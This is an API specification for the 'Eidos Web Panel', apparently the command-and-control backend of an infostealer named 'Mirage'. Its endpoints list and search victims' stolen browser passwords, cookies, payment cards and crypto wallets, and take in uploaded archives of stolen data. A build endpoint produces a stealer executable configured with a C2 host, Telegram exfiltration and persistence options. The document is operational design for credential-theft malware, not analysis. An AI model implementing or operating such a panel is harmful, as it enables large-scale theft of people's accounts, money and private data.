# Eidos Web Panel — API Specification

**Base URL:** `https://panel.example.com/api`  
**Auth:** `Authorization: Bearer <jwt-token>` (кроме `/auth/login`)  
**Content-Type:** `application/json` (кроме `/log` — multipart/form-data)  
**Rate Limit:** 100 requests/min per IP (429 if exceeded)

---

## 1. Authentication

### POST `/api/auth/login`

```
Request:
{
    "username": "admin",
    "password": "supersecret"
}

Response 200:
{
    "token": "eyJhbGciOiJIUzI1NiIs...",
    "expires_at": "2026-07-03T00:00:00Z"
}

Response 401:
{
    "error": "invalid credentials"
}
```

**Rate limit:** 5 attempts/min per IP (brute-force protection). After 10 failures → IP permanently banned.

---

## 2. Dashboard

### GET `/api/stats`

```
Response 200:
{
    "sessions": {
        "total": 1284,
        "today": 47,
        "online_24h": 12
    },
    "passwords": { "total": 12453 },
    "cookies":  { "total": 32451 },
    "cards":    { "total": 893 },
    "wallets":  { "total": 456 },
    "geo": [
        { "country": "RU", "count": 456 },
        { "country": "US", "count": 324 },
        { "country": "DE", "count": 189 }
    ],
    "browsers": [
        { "name": "Chrome",  "count": 8452 },
        { "name": "Edge",    "count": 2341 },
        { "name": "Firefox", "count": 1234 },
        { "name": "Opera",   "count": 426 }
    ],
    "timeline": [
        { "date": "2026-06-02", "count": 38 },
        { "date": "2026-06-03", "count": 52 }
    ],
    "top_domains": [
        { "domain": "google.com",     "count": 452 },
        { "domain": "facebook.com",   "count": 321 }
    ]
}
```

---

## 3. Sessions

### GET `/api/sessions`

Query params:

| Param | Type | Default | Description |
|-------|------|---------|-------------|
| `page` | int | 1 | Page number |
| `limit` | int | 50 | Items per page (max 100) |
| `sort` | string | `-created_at` | Sort field (`+field` = asc, `-field` = desc) |
| `country` | string | — | Filter by country code (ISO 3166-2) |
| `os` | string | — | Filter by OS name |
| `hwid` | string | — | Filter by HWID |
| `ip` | string | — | Filter by IP |
| `from` | date | — | Start date (ISO 8601) |
| `to` | date | — | End date (ISO 8601) |
| `q` | string | — | Full-text search (matches IP, HWID, OS, username) |

```
Response 200:
{
    "items": [
        {
            "id": "a1b2c3d4e5f6...",
            "build_id": "b123...",
            "hwid": "ABC123DEF456...",
            "os": "Windows 11 Pro",
            "username": "john",
            "ip": "192.168.1.100",
            "country_code": "RU",
            "passwords_count": 12,
            "cookies_count": 45,
            "cards_count": 2,
            "wallets_count": 1,
            "files_count": 3,
            "created_at": "2026-07-02T14:30:00Z"
        }
    ],
    "total": 1284,
    "page": 1,
    "limit": 50,
    "pages": 26
}
```

### GET `/api/sessions/{id}`

```
Response 200:
{
    "id": "a1b2c3d4...",
    "hwid": "ABC123...",
    "os": "Windows 11 Pro",
    "username": "john",
    "ip": "192.168.1.100",
    "country_code": "RU",
    "created_at": "2026-07-02T14:30:00Z",
    "system_info": {
        "cpu": "Intel Core i7-13700K",
        "gpu": "NVIDIA RTX 4080",
        "ram": "32 GB",
        "os": "Windows 11 Pro 23H2",
        "screen": "2560x1440",
        "hostname": "DESKTOP-ABC123",
        "local_ip": "192.168.1.100",
        "mac": "00:1A:2B:3C:4D:5E",
        "public_ip": "85.26.134.55",
        "uptime": "3h 12m"
    },
    "passwords": [
        { "id": "p1", "url": "https://google.com", "username": "john@gmail.com", "password_value": "secret123", "browser": "Chrome" }
    ],
    "cookies": [
        { "id": "c1", "domain": ".google.com", "name": "session_id", "value": "abc...", "path": "/" }
    ],
    "cards": [
        { "id": "cc1", "number": "4111********1111", "exp_month": "12", "exp_year": "28", "holder": "John Doe", "cvc": "***" }
    ],
    "wallets": [
        { "id": "w1", "name": "MetaMask", "path": "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/" }
    ],
    "files": [
        { "id": "f1", "filename": "passwords.txt", "size": 12453 }
    ]
}
```

### DELETE `/api/sessions/{id}`

```
Response 200:
{ "deleted": true }
```

Cascade удаляет все связанные записи (passwords, cookies, cards, wallets, files, system_info).

---

## 4. Search

### GET `/api/search`

Query params:

| Param | Type | Default | Description |
|-------|------|---------|-------------|
| `q` | string | — | Search query (required, min 2 chars) |
| `type` | string | `all` | `passwords`, `cookies`, `cards`, `sessions`, `all` |
| `page` | int | 1 | Page number |
| `limit` | int | 50 | Items per page |

```
Response 200:
{
    "results": [
        {
            "type": "password",
            "session_id": "a1b2c3...",
            "url": "https://facebook.com",
            "username": "john@gmail.com",
            "password_value": "secret123",
            "browser": "Chrome",
            "matched_field": "url"
        }
    ],
    "total": 452,
    "page": 1,
    "limit": 50
}
```

---

## 5. Log Ingestion

### POST `/api/log`

```
Content-Type: multipart/form-data; boundary=----Mirage

------Mirage
Content-Disposition: form-data; name="metadata"

{"hwid":"ABC123...","os":"Windows 11","username":"john","ip":"85.26.134.55","country":"RU"}
------Mirage
Content-Disposition: form-data; name="archive"; filename="data.zip"
Content-Type: application/zip

<binary ZIP>
------Mirage--
```

```
Response 200:
{ "session_id": "a1b2c3d4..." }

Response 413:
{ "error": "payload too large" }
```

**ZIP structure expected:**
```
data.zip
├── Browser Data/
│   ├── Chrome_Default_passwords.txt     (tab: url\tusername\tpassword)
│   ├── Chrome_Default_cookies.txt       (tab: domain\t...\tname\tvalue)
│   ├── Chrome_Default_credit_cards.txt  (tab: number\texp_month\texp_year\tholder)
│   └── ...
├── wallets/
│   └── MetaMask/
│       └── ...
├── messengers/
│   └── ...
├── gaming/
│   └── ...
└── system_info.txt
```

### POST `/api/log/chunk`

```
Content-Type: multipart/form-data

session_id: <uuid>
chunk_index: <int>
data: <binary chunk (max 1 MB)>

Response 200:
{ "received": true }
```

### POST `/api/log/complete`

```
Content-Type: multipart/form-data

session_id: <uuid>
total_chunks: <int>
metadata: <json string>

Response 200:
{ "session_id": "a1b2c3d4..." }
```

### POST `/api/log/ssp`

```
Content-Type: application/zip
Body: raw browser profile archive (Login Data + Cookies + Web Data + master_key.bin)

Response 200:
{
    "session_id": "a1b2c3d4...",
    "passwords_extracted": 45,
    "cookies_extracted": 128
}
```

---

## 6. Build

### POST `/api/build`

```
Request:
{
    "c2_host": "127.0.0.1",
    "c2_port": 8443,
    "telegram_token": "YOUR_BOT_TOKEN",
    "telegram_chat_id": "-1003951628380",
    "enable_persistence": false,
    "enable_screenshot": true,
    "enable_grabber": true,
    "include_decryptor": true,
    "build_tag": "my_first_build"
}

Response 200:
{
    "build_id": "b123...",
    "file_size": 124567,
    "config_hash": "sha256:abc...",
    "created_at": "2026-07-02T14:30:00Z"
}
```

### GET `/api/build/{id}/download`

```
Response 200:
Content-Type: application/x-dosexec
Content-Disposition: attachment; filename="mirage_built.exe"

<binary PE>
```

---

## 7. Bans

### GET `/api/bans`

```
Response 200:
{
    "items": [
        { "id": "ban1", "ip": "85.26.134.55", "reason": "Brute-force protection", "banned_at": "2026-07-01T12:00:00Z" }
    ],
    "total": 1
}
```

### POST `/api/bans`

```
Request:
{
    "ip": "85.26.134.55",
    "reason": "Suspicious activity"
}

Response 201:
{ "id": "ban2" }
```

### DELETE `/api/bans/{id}`

```
Response 200:
{ "deleted": true }
```

---

## 8. Settings

### GET `/api/settings`

```
Response 200:
{
    "panel": { "port": 8080, "auth_token": "abc123..." },
    "telegram": { "token": "680547773:...", "chat_id": "-1003951628380" },
    "rate_limit": 100
}
```

### PUT `/api/settings`

```
Request:
{
    "telegram": { "token": "...", "chat_id": "..." },
    "rate_limit": 200
}

Response 200:
{ "updated": true }
```

---

## 9. WebSocket

### WS `/ws`

**Auth:** Token передаётся как query param: `wss://panel.example.com/ws?token=<jwt>`

**Events (server → client):**

```json
{
    "type": "new_session",
    "data": {
        "id": "a1b2c3...",
        "country_code": "RU",
        "passwords_count": 12,
        "created_at": "2026-07-02T14:30:00Z"
    }
}

{
    "type": "stats_update",
    "data": {
        "sessions_total": 1285,
        "sessions_today": 48,
        "passwords_total": 12465
    }
}

{
    "type": "build_complete",
    "data": {
        "build_id": "b123...",
        "file_size": 124567,
        "build_tag": "my_first_build"
    }
}
```

**Ping/Pong:** Server отправляет `{"type": "ping"}` каждые 30s, client отвечает `{"type": "pong"}`.

---

## 10. Error Codes

| Code | HTTP | Description |
|------|------|-------------|
| `invalid_credentials` | 401 | Wrong username or password |
| `token_expired` | 401 | JWT expired (refresh needed) |
| `token_invalid` | 401 | Malformed or revoked token |
| `rate_limited` | 429 | Too many requests |
| `banned` | 403 | IP is banned |
| `payload_too_large` | 413 | Upload exceeds 100 MB |
| `validation_error` | 422 | Invalid request body |
| `not_found` | 404 | Resource not found |
| `internal_error` | 500 | Server error (retry later) |

**Error response format:**

```json
{
    "error": "validation_error",
    "message": "field 'c2_host' is required",
    "details": {
        "field": "c2_host",
        "reason": "required"
    }
}
```
